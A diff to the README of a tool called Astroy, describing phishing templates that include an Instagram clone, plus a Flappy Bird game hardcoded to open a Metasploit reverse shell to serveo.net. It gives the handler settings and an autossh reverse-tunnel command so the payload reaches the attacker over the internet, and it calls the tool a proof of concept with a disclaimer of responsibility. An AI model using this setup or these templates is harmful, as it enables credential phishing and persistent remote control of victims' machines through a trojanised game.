@@ -20,9 +20,9 @@ We live in a generation where, although most people would fall for most get-rich
 
 The web templates include a normal sign up page, and an Instagram clone. The reason I did not add more popular templates like Facebook and Google is because their designs weren't as appealing as Instagram's. Special shout out to [thelinuxchoice](https://github.com/thelinuxchoice) for the Instagram phishing template - I modified their version a bit, removed their backend and added mine.
 
-The Flappy Bird game is hardcoded with the LHOST ``serveo.net`` and LPORT ``2345``. On Metasploit, run ``set lhost localhost`` and ``set lport 2345`` to configure the handler. Run ``autossh -tt -M 0 -o 'ServerAliveInterval 30' -o 'ServerAliveCountMax 3' -R 2345:localhost:2345 serveo.net`` to forward TCP connections, and your payload will connect over WAN.
+The Flappy Bird game is hardcoded with the LHOST ``serveo.net`` and LPORT ``2345``. On Metasploit, run ``set lhost localhost`` and ``set lport 2345`` to configure the handler. Run ``autossh -tt -M 0 -o 'ServerAliveInterval 30' -o 'ServerAliveCountMax 3' -R 2345:localhost:2345 serveo.net`` to forward TCP connections to your machine, and your payload will connect over WAN, only ever disconnecting if you terminate it.
 
-Astroy only serves as a proof of concept to what black hat hackers can achieve if they get creative. I take no responsibility whatsoever for any usage of the tool for any illegal activities by anyone else.
+Astroy only serves as a proof of concept on what black hat hackers can achieve if they get creative. I take no responsibility whatsoever for any usage of the tool for any illegal activities by anyone else.
 
 ## Assumptions
 
